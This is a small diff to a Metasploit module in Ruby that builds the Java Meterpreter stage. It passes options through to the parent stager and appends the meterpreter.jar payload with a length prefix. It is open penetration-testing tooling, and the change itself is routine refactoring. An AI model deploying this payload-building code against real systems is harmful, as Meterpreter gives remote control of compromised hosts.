@@ -53,12 +53,13 @@ module Metasploit3
   # Override the Payload::Java version so we can load a prebuilt jar to be
   # used as the final stage; calls super to get the intermediate stager.
   #
-  def generate_stage
+  def generate_stage(opts={})
+    # TODO: wire the UUID into the stage
     met = MetasploitPayloads.read('meterpreter', 'meterpreter.jar')
 
     # All of the dendencies to create a jar loader, followed by the length
     # of the jar and the jar itself.
-    super + [met.length].pack("N") + met
+    super(opts) + [met.length].pack("N") + met
   end
 
 end
